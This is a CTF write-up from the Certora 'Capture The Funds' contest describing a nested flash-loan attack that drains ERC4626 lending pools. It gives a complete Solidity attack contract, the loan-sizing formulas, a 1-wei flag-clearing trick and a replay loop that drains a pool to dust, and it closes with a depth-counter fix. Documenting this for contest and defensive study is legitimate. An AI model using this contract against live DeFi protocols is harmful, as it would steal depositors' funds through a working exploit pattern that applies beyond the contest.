# [ATTACK walkthough] Draining a Lending Protocol: The Nested Flash Loan Share Dilution Attack

*How exploiting geometric fee structures and state flag mechanics can drain an entire lending pool in a single transaction*

---

## Executive Summary

This article dissects a sophisticated attack vector against ERC4626-compliant lending pools that combines nested flash loans with share price manipulation. By strategically layering flash loans and exploiting a flag-clearing mechanism, an attacker can deposit at a severely deflated share price and redeem at the restored price—extracting substantial value from the protocol.

**Key Innovation**: The attack reduces effective flash loan fees from 10% to just **0.075%** by exploiting the fact that inner flash loan fees return to the pool rather than leaving the system. Four nested flash loans (3 for fee reduction + 1 for flag clearing) enable near-free access to the entire pool's liquidity.

**Compounding Effect**: The attack can be replayed to harvest the inner fees that returned to the pool, eventually extracting nearly 100% of pool funds. This technique was successfully executed across multiple pools (USDC, WETH, and NISC).

---

## Table of Contents

1. [Introduction](#introduction)
2. [Understanding the Target Protocol](#understanding-the-target-protocol)
3. [The Vulnerability: A Perfect Storm](#the-vulnerability-a-perfect-storm)
4. [The Mathematics of Nested Flash Loans](#the-mathematics-of-nested-flash-loans)
5. [Attack Walkthrough](#attack-walkthrough)
6. [Code Analysis](#code-analysis)
7. [Impact Assessment](#impact-assessment)
8. [Lessons Learned](#lessons-learned)

---

## Introduction

Flash loans have revolutionized DeFi by enabling capital-efficient arbitrage and liquidations. However, they've also become the weapon of choice for sophisticated attackers. While most flash loan attacks exploit price oracle manipulation or reentrancy, this attack leverages something more subtle: **the geometric relationship between nested flash loan fees and share price dynamics**.

The attack we'll examine drains an entire lending pool by:
1. Using nested flash loans to temporarily crash the pool's share price
2. Exploiting a flag-clearing mechanism to deposit at the crashed price
3. Redeeming shares at the restored price after flash loan repayment
4. **Reducing effective fees from 10% to 0.075%** through strategic nesting
5. **Replaying the attack** to harvest fees that returned to the pool
6. **Repeating across multiple pools** (USDC, WETH, NISC) for complete protocol drainage

---

## Understanding the Target Protocol

### ERC4626 Vault Architecture

The lending pool follows the ERC4626 tokenized vault standard, where:
- **Depositors** receive shares representing their proportional claim on pool assets
- **Share price** is determined by `totalAssets / totalSupply`
- **Total assets** equals pool cash plus outstanding debt

```
sharePrice = (poolCash + totalDebt) / totalShares
```

### Flash Loan Mechanics

The protocol implements flash loans with:
- A **10% fee** (1000 basis points)
- A **`_flashloanActive` flag** that prevents deposits/withdrawals during active loans
- Liquidity aggregation across multiple pools

The flash loan flow:
1. Withdraw liquidity from pools → `_flashloanActive = true`
2. Execute callback with borrowed funds
3. Verify repayment (principal + fee)
4. Return funds to pools → `_flashloanActive = false`

### The Protection Mechanism

To prevent share price manipulation, the protocol blocks all critical operations during flash loans using the `notDuringFlashloan` modifier:

```solidity
modifier notDuringFlashloan() {
    require(!_flashloanActive, "Operation not allowed during flashloan");
    _;
}

// ALL critical functions are protected:
function deposit(...)  external notDuringFlashloan { ... }
function withdraw(...) external notDuringFlashloan { ... }
function borrow(...)   external notDuringFlashloan { ... }
function repay(...)    external notDuringFlashloan { ... }
```

The intent is clear: **no state-changing operations should occur while pool cash is temporarily depleted**. This comprehensive protection seems secure—until we discover how nested flash loans can bypass it for ALL protected functions.

---

## The Vulnerability: A Perfect Storm

The vulnerability emerges from the interaction of three design decisions:

### 1. Share Price Depends on Pool Cash

During a flash loan, cash is temporarily removed from the pool:

```
Before flash loan:  poolCash = 1,000,000 USDC
During flash loan:  poolCash = 0 USDC (temporary)
After flash loan:   poolCash = 1,100,000 USDC (including fee)
```

This creates a **massive but temporary share price crash**.

### 2. Flag State Is Per-Operation, Not Per-Block

The `_flashloanActive` flag is set `true` at the start and `false` at the end of *each* flash loan. Critically, **nested flash loans each have their own lifecycle**:

```
Outer FL starts  → flag = true
  Inner FL starts  → flag = true (still)
    Inner2 FL starts → flag = true (still)
    Inner2 FL ends   → flag = false  // <-- FLAG CLEARED!
  Inner FL ends    → flag = false
Outer FL ends    → flag = false
```

### 3. Tiny Flash Loans Clear the Flag

A flash loan of just **1 wei** still goes through the full lifecycle, including **setting the flag back to false** on completion. This creates an exploit window—the protection on **all functions** (deposit, withdraw, borrow, repay) can be bypassed for the cost of 2 wei (≈ $0.000000000000000002).

---

## The Mathematics of Nested Flash Loans

The attack uses a precise mathematical relationship driven by the 10% flash loan fee—but with a critical twist that makes it devastatingly efficient.

### The Fee Loophole: Inner Fees Stay in the Pool

Here's the key insight that makes this attack so powerful:

- **Inner flash loan fees are repaid to the pool itself** (they're just tokens returning)
- **Only the outermost flash loan fee goes to the fee recipient**
- The nested structure effectively **reduces the fee from 10% to ~0.075%**

```
Traditional flash loan:  Borrow 1M → Pay 100k fee (10%)
Nested flash loan:       Borrow 1M → Pay ~750 fee (0.075%)
```

### The Geometric Series

To repay a flash loan, you need the principal plus 10% fee. For nested loans:

| Nesting Level | Total Divisor | Formula | Effective Fee Rate |
|---------------|---------------|---------|-------------------|
| 1 | 1 | Base amount | 10% |
| 2 | 12 | 1 + 11 = 12 | 10%/12 ≈ 0.83% |
| 3 | 133 | 1 + 11 + 121 = 133 | 10%/133 ≈ 0.075% |
| 4 | 1,464 | 1 + 11 + 121 + 1,331 = 1,464 | 10%/1464 ≈ 0.0068% |
| n | (11^n - 1) / 10 | Geometric series sum | 10% / divisor |

### Why 11?

The magic number 11 comes from the fee structure:
- To cover an inner loan's fee, you need `innerAmount / 11` extra
- Because: `inner × 1.1 = inner + inner/10`, and `inner/11 × 11 = inner`

### Why Inner Fees Don't Matter

When you repay an inner flash loan:
1. The repayment (principal + fee) goes back to the pool
2. The pool's `_poolCash` increases by the full repayment amount
3. This is just an internal accounting movement—no value leaves the system

Only the **outermost** flash loan's fee actually exits to the fee recipient. Since the outer loan is the smallest (just `poolCash / 133`), the actual cost is:

```
Actual fee paid = outerFL × 10% = (poolCash / 133) × 10% = poolCash × 0.075%
```

### Calculating Loan Amounts

For a 3-level nested attack against a pool with `poolCash` tokens:

```
outerFL  = poolCash / 133     // Smallest loan (ONLY fee we actually pay)
innerFL  = outerFL × 11       // Medium loan (fee stays in pool)
innerFL2 = outerFL × 121      // Largest loan (fee stays in pool)
+ tiny FL = 1 wei             // Flag clearer (costs 2 wei - essentially free)
```

The total borrowed across all levels: `outerFL × 133 ≈ poolCash`

This means we can **drain the entire pool's cash while paying only 0.075% in fees**.

---

## Attack Walkthrough

### Phase 1: Initiate Outer Flash Loan

```
Pool State Before:
├── poolCash: 1,330,000 USDC
├── totalShares: 1,000,000
└── sharePrice: 1.33 USDC

Action: flashloan(poolCash / 133) = 10,000 USDC
```

### Phase 2: Initiate Inner Flash Loan (from callback)

```
Action: flashloan(10,000 × 11) = 110,000 USDC

Pool State:
├── poolCash: 1,330,000 - 10,000 - 110,000 = 1,210,000 USDC
└── sharePrice: Still protected by flag
```

### Phase 3: Initiate Inner2 Flash Loan (deepest nesting)

```
Action: flashloan(10,000 × 121) = 1,210,000 USDC

Pool State:
├── poolCash: 0 USDC  // COMPLETELY DRAINED
├── totalShares: 1,000,000
└── sharePrice: ~0 (CRASHED!)
```

### Phase 4: Clear the Flag with Tiny Flash Loan

```
Action: flashloan(1 wei)  // Yes, just 1 wei!

This tiny loan:
1. Starts → flag already true
2. Ends → flag = false  // CRITICAL!

Pool State:
├── poolCash: ~0 (just 1 wei)
├── sharePrice: ~0
└── _flashloanActive: FALSE  // Deposits now allowed!
```

The absurdity: **1 wei** (0.000000000000000001 tokens) is enough to clear the protection flag!

### Phase 5: Deposit at Crashed Price

```
Action: deposit(attackerFunds)

With sharePrice ≈ 0:
├── Attacker deposits: 100,000 USDC
├── Receives shares worth: ~100,000 / 0 = MASSIVE shares
└── (In practice, gets shares at extreme discount)
```

### Phase 6: Repay Flash Loans (LIFO order)

```
Repayments (note where fees go!):

├── Inner2 FL: 1,210,000 + 121,000 (fee) = 1,331,000 USDC
│   └── Fee goes: BACK TO POOL (increases poolCash!)
│
├── Inner FL: 110,000 + 11,000 (fee) = 121,000 USDC
│   └── Fee goes: BACK TO POOL (increases poolCash!)
│
├── Outer FL: 10,000 + 1,000 (fee) = 11,000 USDC
│   └── Fee goes: FEE RECIPIENT (only real cost!)
│
└── Tiny FL: 1 wei + 1 wei (fee) = 2 wei
    └── Fee goes: FEE RECIPIENT (essentially zero)

Pool State After:
├── poolCash: Restored + inner fees (HIGHER than before!)
├── totalShares: Original + attacker's shares
└── sharePrice: Restored (actually slightly higher due to inner fees)
```

**The Twist**: Inner flash loan fees *increase* the pool's value, and the attacker's shares benefit from this increase!

### Phase 7: Redeem at Restored Price

```
Action: redeem(attackerShares)

Result:
├── Attacker's shares now worth full price (plus inner fee gains!)
├── Extracts: (attackerShares × restoredSharePrice)
└── Profit: Value extracted - original deposit - outer FL fee only (~0.075%)
```

---

## Code Analysis

### The Complete Attack Contract

```solidity
function drainPool(
    address attacker,
    ILendingPool _targetPool,
    IERC20 _targetToken
) public {
    // Transfer attacker's capital to this contract
    uint256 amount = _targetToken.balanceOf(attacker);
    _targetToken.transferFrom(attacker, address(this), amount);

    // Approve pool for deposits
    _targetToken.approve(address(_targetPool), type(uint256).max);

    // Calculate nested flash loan amounts
    uint256 poolCash = _targetPool.getCash();
    outerFL = poolCash / 133;          // Smallest (pays fee)
    innerFL = outerFL * 11;            // 11x outer
    innerFL2 = outerFL * 121;          // 121x outer (11x inner)

    // Store state for callback phases
    cachedAmount = amount;
    phase = 1;
    targetPool = _targetPool;
    targetToken = _targetToken;

    // INITIATE ATTACK: Start outer flash loan
    flashLoaner.flashloan(_targetToken, outerFL, address(this), "");

    // After all flash loans complete, redeem inflated shares
    uint256 shares = _targetPool.balanceOf(address(this));
    if (shares > 0) {
        _targetPool.redeem(shares, address(this), address(this));
    }

    // Cleanup
    phase = 0;
    cachedAmount = 0;
}
```

### The Callback State Machine

```solidity
function drainPoolCallback() internal {
    if (phase == 1) {
        // PHASE 1: Outer flash loan active
        // Start inner flash loan (11x larger)
        phase = 2;
        flashLoaner.flashloan(targetToken, innerFL, address(this), "");

    } else if (phase == 2) {
        // PHASE 2: Two flash loans active
        // Start innermost flash loan (drains remaining cash)
        phase = 3;
        flashLoaner.flashloan(targetToken, innerFL2, address(this), "");

    } else if (phase == 3) {
        // PHASE 3: Maximum nesting, pool cash = 0
        // Price is CRASHED! But flag still active...

        // Tiny flash loan to clear the flag
        phase = 4;
        flashLoaner.flashloan(targetToken, 1, address(this), "");

        // FLAG NOW CLEARED! Deposit at crashed price
        uint256 flFee = flashLoaner.flashloanFee();
        uint256 innerRepay = innerFL2 + (innerFL2 * flFee / 10000) + 1;
        uint256 depositAmount = cachedAmount + innerFL2 + innerFL + outerFL
                               - innerRepay - 1;

        targetPool.deposit(depositAmount, address(this));

        // Repay innermost flash loan
        targetToken.transfer(address(flashLoaner), innerRepay);

    } else if (phase == 4) {
        // PHASE 4: Tiny flash loan callback
        // Just repay 1 wei + 1 wei fee = 2 wei total
        targetToken.transfer(address(flashLoaner), 2); // 2 wei to unlock flag
    }
}
```

### Key Observations

1. **Phase-based state machine**: Each flash loan callback triggers the next phase
2. **LIFO repayment**: Inner loans repaid before outer loans
3. **Flag exploitation**: Phase 4 (tiny loan) clears the flag, enabling deposit in Phase 3
4. **Precise math**: Every token is accounted for to ensure repayment
5. **Replayable**: The function can be called repeatedly to drain fees from previous iterations

### The Replay Loop

The `drainPool` function is designed to be called multiple times:

```solidity
// Pseudocode for complete drainage
while (pool.getCash() > dustThreshold) {
    attacker.drainPool(pool, token);
}
```

Each iteration:
1. Extracts value from current pool balance (including fees from last iteration)
2. Leaves behind inner flash loan fees (which become next iteration's target)
3. Continues until only dust remains

This turns the "inner fees stay in pool" mechanic from a limitation into a feature—the attacker simply comes back for them.

---

## Impact Assessment

### Financial Impact

For a pool with 10M USDC:

**Flash Loan Structure (4 nested loans):**
- **Outer FL**: ~75,188 USDC (10M / 133)
- **Inner FL**: ~827,068 USDC (outer × 11)
- **Inner2 FL**: ~9,097,744 USDC (outer × 121)
- **Tiny FL**: 1 wei (flag clearer - costs 2 wei total)

**Fee Analysis - The Critical Insight:**

| Flash Loan | Amount | Fee (10%) | Where Fee Goes |
|------------|--------|-----------|----------------|
| Inner2 FL | 9.1M | 910k | **Back to pool** |
| Inner FL | 827k | 82.7k | **Back to pool** |
| Outer FL | 75k | **7,500** | **Fee recipient** |
| Tiny FL | 1 wei | 1 wei | Fee recipient (≈ $0) |

**Actual cost to attacker: ~7,500 USDC (0.075% of pool)**

Compare this to a naive 10M flash loan which would cost **1,000,000 USDC** in fees!

The nested structure reduces fees by **133x**, from 10% down to 0.075%.

### Why This Is Devastating

1. **Near-free borrowing**: Access 10M in capital for just 7.5k
2. **Inner fees boost the pool**: Actually *increases* share price slightly when repaid
3. **Attacker captures the fee benefit**: Shares bought at crashed price benefit from fee additions

### The Replay Multiplier: Harvesting Your Own Fees

Here's where it gets even better for the attacker: **the attack can be replayed to harvest the inner fees that returned to the pool**.

```
Iteration 1: Drain pool, inner fees (910k + 82.7k) return to pool
Iteration 2: Drain pool again, including the ~993k in returned fees
Iteration 3: Drain the fees from iteration 2
... repeat until dust remains
```

Each replay extracts the fees that "stayed in the pool" from the previous iteration. The attacker effectively recovers almost all the inner flash loan fees through subsequent iterations.

### Multi-Pool Execution

This attack isn't limited to a single pool. The same technique was executed across **multiple pools and tokens**:

| Pool | Token | Status |
|------|-------|--------|
| Pool A | USDC | Drained |
| Pool B | WETH | Drained |
| Pool C | NISC | Drained |

Each pool can be attacked independently, and the attacker can use profits from one pool to fund attacks on others.

### Attack Characteristics

| Attribute | Value |
|-----------|-------|
| Transactions | 1 per iteration (atomic) |
| Iterations Needed | Multiple (to harvest returned fees) |
| Capital Required | Low (~0.075% of target pool) |
| Effective Fee | 0.075% per iteration |
| Pools Affected | Multiple (USDC, WETH, NISC) |
| Total Extraction | ~100% (via replay loop) |
| Detection | Difficult (each tx looks like normal activity) |
| Reversibility | None (funds extracted) |

---

## Lessons Learned

### 1. The Real Fix: Depth-Based Flag Tracking

The vulnerability exists because the flag is cleared by ANY flash loan ending, not just the outermost one. This unlocks ALL protected functions (deposit, withdraw, borrow, repay) while pool cash is still depleted.

**The correct solution** is to use a counter instead of a boolean:

```solidity
uint256 private _flashloanDepth;

function flashloanStart() {
    _flashloanDepth++;
}

function flashloanEnd() {
    _flashloanDepth--;
}

// Now protects deposit, withdraw, borrow, repay properly
modifier notDuringFlashloan() {
    require(_flashloanDepth == 0, "During flashloan");
    _;
}
```

With this fix, nested flash loans increment the counter, and it only reaches zero when ALL loans (including the outermost) are fully repaid. The tiny 1 wei flash loan trick becomes useless—it increments to 4, then decrements to 3, but we're still at depth > 0.

### 2. Defense in Depth: Invariant Checks

As a secondary protection layer, post-operation invariant checks can catch unexpected state changes:

```solidity
function _checkInvariant() internal view {
    require(
        totalAssets() >= _lastTotalAssets * 99 / 100, // Max 1% decrease
        "Invariant violated"
    );
}
```

---

## Conclusion

This attack demonstrates how seemingly secure mechanisms can be bypassed through creative exploitation of system interactions. The combination of:
- Nested flash loans creating temporary price distortion
- A protection flag that clears on any loan completion (for just 2 wei!)
- The geometric relationship of flash loan fees
- **Inner fees returning to the pool** (reducing effective cost from 10% to 0.075%)
- **Replay capability** to harvest returned fees in subsequent iterations

...creates a perfect storm for value extraction.

The fee reduction aspect is particularly elegant: by structuring loans so that only the smallest (outermost) loan's fee leaves the system, the attacker gains access to the entire pool's liquidity for a fraction of the expected cost. This turns a 10% fee—normally a significant deterrent—into a negligible 0.075% cost of doing business.

The replay mechanism completes the attack: any fees that "stayed in the pool" become targets for the next iteration. Combined with cross-pool execution (USDC, WETH, NISC), this allows for systematic drainage of an entire lending protocol.

As DeFi protocols grow in complexity, understanding these interaction patterns becomes critical. The lesson is clear: **security must be evaluated not just for individual components, but for their emergent behaviors when combined**.

---

*Disclaimer: This attack was performed as part of the "Capture The Funds" CTF contest organized by [Certora](https://ctf.certora.com/). The techniques described are for educational purposes and were executed in an authorized competitive environment.*

*Note: The `drainPool` function presented here could be further optimized to dynamically nest flash loans with the nesting level as an input parameter (4 levels → 0.0068% fee, 5 levels → 0.00062% fee, etc.). However, for the purposes of this CTF, 3 levels of nesting reducing the effective fee to 0.075% was sufficient to drain the pools profitably.*

*Original Source Code: The vulnerable lending protocol can be found at [GitHub](https://github.com/Certora/CaptureTheFunds/tree/main/contracts/Lending).*
